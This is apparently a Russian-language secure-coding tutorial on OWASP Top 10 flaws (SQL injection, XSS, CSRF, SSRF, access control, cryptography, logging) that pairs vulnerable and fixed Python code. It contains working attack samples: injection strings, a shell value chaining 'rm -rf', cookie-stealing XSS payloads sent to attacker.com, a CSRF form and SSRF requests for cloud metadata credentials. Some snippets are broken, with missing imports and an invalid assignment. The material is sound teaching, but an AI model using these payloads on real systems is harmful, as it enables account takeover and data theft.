# OWASP Top 10: SQL injection, XSS, CSRF, SSRF

## Введение

OWASP (Open Web Application Security Project) ежегодно публикует список самых критических уязвимостей веб-приложений. OWASP Top 10 — это не просто перечень: каждый пункт содержит описание угрозы, примеры атак и рекомендации по защите. Знание этих уязвимостей обязательно для любого веб-разработчика.

Версия 2021 года отражает эволюцию угроз: появился SSRF (Server-Side Request Forgery), Insecure Design выделен в отдельную категорию. В этой статье рассмотрим наиболее важные категории с примерами уязвимого и защищённого кода.

---

## 1. A03: Injection — SQL Injection

SQL Injection — инъекция вредоносного SQL кода в запросы к базе данных. Это классическая, но по-прежнему широко распространённая уязвимость.

### Уязвимый код

```python
import sqlite3

# УЯЗВИМО: прямая конкатенация пользовательского ввода
def vulnerable_login(username: str, password: str) -> bool:
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    
    # Прямая конкатенация — ОПАСНО!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"Query: {query}")
    
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    return result is not None

# Атака: username = "admin'--"
# Query становится: SELECT * FROM users WHERE username='admin'--' AND password='anything'
# -- начинает комментарий → условие пароля игнорируется!
result = vulnerable_login("admin'--", "anything")
print(f"Обход аутентификации: {result}")  # True если admin существует

# Ещё хуже: username = "'; DROP TABLE users; --"
# Удаление таблицы!
```

### Защищённый код — параметризованные запросы

```python
def secure_login(username: str, password: str) -> bool:
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    
    # Параметризованные запросы — БЕЗОПАСНО
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(query, (username, password))  # username передаётся как ДАННЫЕ, не код
    
    result = cursor.fetchone()
    conn.close()
    return result is not None

# Атаки невозможны: "admin'--" будет воспринят как literal строка
result = secure_login("admin'--", "anything")
print(f"Попытка injection блокирована: {result}")  # False (нет такого пользователя)
```

### SQLAlchemy ORM — автоматическая защита

```python
from sqlalchemy import create_engine, text
from sqlalchemy.orm import Session

engine = create_engine("sqlite:///users.db")

# ORM автоматически параметризует запросы
def secure_login_orm(session: Session, username: str, password: str):
    from sqlalchemy import select
    from models import User  # предполагаемая модель
    
    stmt = select(User).where(User.username == username, User.password == password)
    return session.execute(stmt).first()

# Если нужен raw SQL — используйте text() с параметрами:
def secure_raw_sql(session: Session, user_id: int):
    result = session.execute(
        text("SELECT * FROM users WHERE id = :user_id"),
        {"user_id": user_id}
    )
    return result.fetchone()
```

### Другие типы инъекций

| Тип              | Описание                              | Защита                          |
|-----------------|---------------------------------------|---------------------------------|
| SQL Injection   | Вредоносный SQL                       | Параметризованные запросы       |
| NoSQL Injection | MongoDB: `{"$where": "..."}"`        | Валидация типов                 |
| OS Command Injection | `os.system(user_input)`         | Избегать shell=True, whitelist  |
| LDAP Injection  | Манипуляция LDAP запросами           | Экранирование, whitelist        |
| XPath Injection | XML/XPath запросы                    | Параметризация                  |

```python
import subprocess

# УЯЗВИМО: shell injection
def vulnerable_ping(host: str):
    os.system(f"ping -c 1 {host}")
    # Ввод: "google.com; rm -rf /tmp"

# БЕЗОПАСНО: без shell, аргументы как список
def secure_ping(host: str):
    # Белый список разрешённых символов
    import re
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        raise ValueError("Invalid hostname")
    
    result = subprocess.run(
        ["ping", "-c", "1", host],  # Список аргументов, не строка
        capture_output=True,
        timeout=5
    )
    return result.returncode == 0
```

---

## 2. XSS — Cross-Site Scripting

XSS позволяет злоумышленнику внедрить вредоносный JavaScript в страницы, просматриваемые другими пользователями.

### Типы XSS

**Reflected XSS:** вредоносный код в URL, отражается в ответе сервера:
```
https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

**Stored (Persistent) XSS:** код сохраняется в базе данных (комментарии, профиль):
```html
<!-- Комментарий пользователя -->
<script>fetch('https://attacker.com/'+document.cookie)</script>
```

**DOM-based XSS:** вредоносный код через DOM API:
```javascript
// Уязвимый код
document.getElementById('output').innerHTML = location.hash.substring(1);
// URL: https://example.com/#<img src=x onerror=alert(1)>
```

### Защита от XSS

```python
from markupsafe import escape  # pip install markupsafe

# УЯЗВИМО
def vulnerable_render(user_input: str) -> str:
    return f"<div>Hello, {user_input}!</div>"

# БЕЗОПАСНО: экранирование
def secure_render(user_input: str) -> str:
    safe_input = escape(user_input)  # < → &lt;, > → &gt;, & → &amp;, etc.
    return f"<div>Hello, {safe_input}!</div>"

# Flask автоматически экранирует в Jinja2 шаблонах:
# {{ user_input }}      → автоматическое экранирование (БЕЗОПАСНО)
# {{ user_input | safe }} → отключает экранирование (ОПАСНО — только для доверенного HTML)

user_payload = "<script>alert('XSS')</script>"
print(f"Уязвимо: {vulnerable_render(user_payload)}")
print(f"Безопасно: {secure_render(user_payload)}")
```

### Content Security Policy (CSP)

CSP — HTTP заголовок, ограничивающий источники скриптов, стилей, изображений:

```python
from flask import Flask, Response

app = Flask(__name__)

@app.after_request
def add_security_headers(response: Response) -> Response:
    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline'; "  # 'unsafe-inline' лучше избегать
        "img-src 'self' data: https:; "
        "font-src 'self' https://fonts.googleapis.com; "
        "connect-src 'self' https://api.example.com; "
        "frame-ancestors 'none'; "  # Защита от clickjacking
        "base-uri 'self'; "
        "form-action 'self'"
    )
    
    # Другие защитные заголовки
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'  # Устаревший, CSP frame-ancestors лучше
    response.headers['X-XSS-Protection'] = '0'    # В современных браузерах отключён и лучше CSP
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    return response
```

---

## 3. CSRF — Cross-Site Request Forgery

CSRF заставляет аутентифицированного пользователя непреднамеренно выполнить действие на сайте. Атака использует то, что браузер автоматически отправляет cookies.

### Атака CSRF

```html
<!-- Страница злоумышленника: evil.com -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker_account">
    <input name="amount" value="10000">
  </form>
</body>
</html>
```

Если пользователь залогинен в bank.com — браузер автоматически отправит его cookies, и транзакция выполнится.

### Защита через CSRF Token

```python
import secrets
from flask import Flask, session, request, abort

app = Flask(__name__)
app.secret_key = secrets.token_bytes(32)

def generate_csrf_token() -> str:
    """Генерация и сохранение CSRF токена в сессии"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_urlsafe(32)
    return session['csrf_token']

def validate_csrf_token() -> None:
    """Проверка CSRF токена в запросе"""
    token = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
    if not token or not hmac.compare_digest(token, session.get('csrf_token', '')):
        abort(403, "CSRF validation failed")

@app.route('/transfer', methods=['POST'])
def transfer():
    validate_csrf_token()  # Проверяем CSRF перед любым изменением состояния
    
    to_account = request.form['to']
    amount = request.form['amount']
    # Выполняем перевод
    return "Transfer successful"

# В HTML шаблоне (Jinja2):
# <form method="POST" action="/transfer">
#   <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
#   ...
# </form>
```

### SameSite Cookie

Современный и более простой способ защиты:

```python
from flask import Response

def set_session_cookie(response: Response, session_id: str) -> None:
    response.set_cookie(
        'session',
        session_id,
        httponly=True,          # Недоступен для JavaScript (XSS защита)
        secure=True,            # Только HTTPS
        samesite='Strict',      # НЕ отправлять с cross-site запросов (CSRF защита)
        # samesite='Lax'        # Более мягкий: только GET запросы от других сайтов
        max_age=3600
    )
```

`SameSite=Strict` — куки не отправляются с любых cross-site запросов. Это полностью блокирует атаку CSRF, но ломает некоторые сценарии (ссылки из email).

`SameSite=Lax` — куки не отправляются с POST запросов cross-site, только с GET. Защищает от большинства CSRF при меньших ограничениях.

---

## 4. SSRF — Server-Side Request Forgery

SSRF позволяет заставить сервер сделать HTTP-запрос к произвольному ресурсу, включая внутреннюю инфраструктуру.

### Атака SSRF

```
Приложение позволяет пользователю указать URL изображения:
POST /api/fetch-image
{"url": "https://user-provided-url.com/image.jpg"}

Атака:
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ Получаем AWS IAM credentials instance metadata!

{"url": "http://internal-db:5432/"}
→ Сканирование внутренней сети!

{"url": "file:///etc/passwd"}
→ Чтение локальных файлов!
```

### Защита от SSRF

```python
import ipaddress
from urllib.parse import urlparse
import socket

ALLOWED_URL_SCHEMES = {"https", "http"}
BLOCKED_NETWORKS = [
    ipaddress.ip_network("127.0.0.0/8"),    # Loopback
    ipaddress.ip_network("10.0.0.0/8"),     # Private
    ipaddress.ip_network("172.16.0.0/12"),  # Private
    ipaddress.ip_network("192.168.0.0/16"), # Private
    ipaddress.ip_network("169.254.0.0/16"), # Link-local (AWS metadata!)
    ipaddress.ip_network("::1/128"),        # IPv6 loopback
    ipaddress.ip_network("fc00::/7"),       # IPv6 private
]

def is_safe_url(url: str) -> tuple[bool, str]:
    """Проверка URL на безопасность (SSRF защита)"""
    
    try:
        parsed = urlparse(url)
    except Exception:
        return False, "Invalid URL"
    
    # Только разрешённые схемы
    if parsed.scheme not in ALLOWED_URL_SCHEMES:
        return False, f"Scheme {parsed.scheme} not allowed"
    
    # Должен быть hostname
    if not parsed.hostname:
        return False, "No hostname"
    
    # Резолвим hostname в IP
    try:
        ip_str = socket.gethostbyname(parsed.hostname)
        ip = ipaddress.ip_address(ip_str)
    except (socket.gaierror, ValueError):
        return False, "Cannot resolve hostname"
    
    # Проверяем что IP не в заблокированных сетях
    for network in BLOCKED_NETWORKS:
        if ip in network:
            return False, f"IP {ip} is in blocked network {network}"
    
    # Whitelist подход: только разрешённые домены (предпочтительнее!)
    # ALLOWED_DOMAINS = {"api.external-service.com", "cdn.approved.com"}
    # if parsed.hostname not in ALLOWED_DOMAINS:
    #     return False, "Domain not in allowlist"
    
    return True, "OK"

import requests

def safe_fetch_url(url: str) -> bytes:
    """Безопасный fetch URL с SSRF защитой"""
    is_safe, reason = is_safe_url(url)
    if not is_safe:
        raise ValueError(f"URL rejected: {reason}")
    
    # Дополнительные меры:
    response = requests.get(
        url,
        timeout=5,
        allow_redirects=False,  # Не следовать редиректам (могут ведти на внутренние адреса)
        verify=True              # Проверять SSL сертификат
    )
    
    if response.is_redirect:
        raise ValueError("Redirects not allowed")
    
    return response.content

# Тесты
print(is_safe_url("https://example.com/image.jpg"))         # (True, 'OK')
print(is_safe_url("http://169.254.169.254/latest/meta-data/"))  # (False, ...)
print(is_safe_url("http://10.0.0.1/admin"))                 # (False, ...)
print(is_safe_url("file:///etc/passwd"))                     # (False, ...)
```

---

## 5. A01: Broken Access Control

Наиболее распространённая уязвимость 2021 года:

```python
# УЯЗВИМО: нет проверки принадлежности ресурса
@app.route('/api/documents/<int:doc_id>')
def get_document(doc_id: int):
    user_id = get_current_user_id()
    # Пользователь может запросить ЛЮБОЙ документ!
    doc = db.query("SELECT * FROM documents WHERE id=?", (doc_id,))
    return jsonify(doc)

# БЕЗОПАСНО: проверка принадлежности
@app.route('/api/documents/<int:doc_id>')
def get_document_secure(doc_id: int):
    user_id = get_current_user_id()
    
    # Добавляем проверку owner_id!
    doc = db.query(
        "SELECT * FROM documents WHERE id=? AND owner_id=?",
        (doc_id, user_id)
    )
    if not doc:
        abort(404)  # Не раскрываем существование документа
    return jsonify(doc)
```

---

## 6. A02: Cryptographic Failures

Неправильное использование криптографии:

```python
# ПЛОХО: MD5 для паролей
import hashlib
bad_hash = hashlib.md5(password.encode()).hexdigest()

# ПЛОХО: Base64 — это НЕ шифрование!
import base64
"encrypted" = base64.b64encode(b"password").decode()  # Тривиально декодируется

# ПЛОХО: ECB режим
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
ecb_cipher = Cipher(algorithms.AES(key), modes.ECB())  # Паттерны видны!

# ХОРОШО: AES-GCM для шифрования
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
key = os.urandom(32)
nonce = os.urandom(12)
ciphertext = AESGCM(key).encrypt(nonce, plaintext, None)

# ХОРОШО: Argon2 для паролей
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
```

---

## 7. A09: Security Logging and Monitoring Failures

Без логирования атаки остаются незамеченными:

```python
import logging
import json
from datetime import datetime

# Структурированное логирование security событий
security_logger = logging.getLogger('security')

class SecurityEvent:
    def __init__(self, event_type: str, user_id: str, ip: str, **kwargs):
        self.data = {
            "timestamp": datetime.utcnow().isoformat(),
            "event_type": event_type,
            "user_id": user_id,
            "ip_address": ip,
            **kwargs
        }
    
    def log(self, level: str = "info"):
        msg = json.dumps(self.data)
        getattr(security_logger, level)(msg)

# Логирование в key security точках
def login_attempt(username: str, success: bool, ip: str):
    event_type = "LOGIN_SUCCESS" if success else "LOGIN_FAILURE"
    SecurityEvent(
        event_type=event_type,
        user_id=username,
        ip=ip,
        result="success" if success else "failure"
    ).log("info" if success else "warning")
    
    # Обнаружение brute force
    if not success:
        increment_failed_attempts(username, ip)
        if get_failed_attempts(username, ip) > 5:
            SecurityEvent(
                "BRUTE_FORCE_DETECTED",
                user_id=username,
                ip=ip,
                attempts=get_failed_attempts(username, ip)
            ).log("error")

# Что должно логироваться:
# - Все попытки аутентификации (успешные и неуспешные)
# - Изменения привилегий
# - Доступ к чувствительным данным
# - Ошибки аутентификации/авторизации
# - Ввод невалидных данных
# - Административные действия
```

---

## 8. Практический чеклист

```python
# Чеклист безопасности веб-приложения

SECURITY_CHECKLIST = {
    "SQL Injection": [
        "Используются параметризованные запросы везде",
        "ORM не позволяет raw SQL без параметров",
        "Нет конкатенации пользовательского ввода в SQL"
    ],
    "XSS": [
        "Все выводы в HTML экранируются",
        "CSP заголовок настроен",
        "Нет innerHTML с пользовательскими данными",
        "Cookies имеют HttpOnly флаг"
    ],
    "CSRF": [
        "CSRF токены для всех state-changing запросов",
        "SameSite=Strict или Lax для session cookies",
        "Double Submit Cookie для SPA"
    ],
    "SSRF": [
        "Whitelist разрешённых URL/доменов",
        "Блокировка внутренних IP адресов",
        "Нет следования редиректам при server-side запросах"
    ],
    "Access Control": [
        "Проверка прав на каждый endpoint",
        "Проверка принадлежности ресурса пользователю",
        "Deny by default"
    ],
    "Crypto": [
        "HTTPS везде (HSTS)",
        "AES-256-GCM или ChaCha20-Poly1305 для шифрования",
        "Argon2id для паролей",
        "TLS 1.2+ с PFS"
    ]
}

for category, checks in SECURITY_CHECKLIST.items():
    print(f"\n{category}:")
    for check in checks:
        print(f"  ☐ {check}")
```

---

## Заключение

OWASP Top 10 охватывает наиболее критические уязвимости, с которыми сталкивается большинство веб-приложений.

**Ключевые выводы:**
1. **SQL Injection** — всегда параметризованные запросы, никогда конкатенация
2. **XSS** — экранирование вывода + CSP заголовок
3. **CSRF** — SameSite cookies + CSRF токены
4. **SSRF** — whitelist URL, блокировка внутренних адресов
5. **Broken Access Control** — проверка прав на каждый запрос
6. **Logging** — логируйте всё подозрительное для обнаружения атак

---

## Литература и источники

1. OWASP Top 10 2021. https://owasp.org/Top10/
2. OWASP. *SQL Injection Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
3. OWASP. *XSS Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
4. OWASP. *CSRF Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
5. OWASP. *Server Side Request Forgery Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
6. PortSwigger. *Web Security Academy*. https://portswigger.net/web-security
7. RFC 7034. (2013). *HTTP Header Field X-Frame-Options*. IETF. https://www.rfc-editor.org/rfc/rfc7034
8. W3C. *Content Security Policy Level 3*. https://www.w3.org/TR/CSP3/
9. Wikipedia: Cross-site scripting. https://en.wikipedia.org/wiki/Cross-site_scripting
10. Wikipedia: SQL injection. https://en.wikipedia.org/wiki/SQL_injection
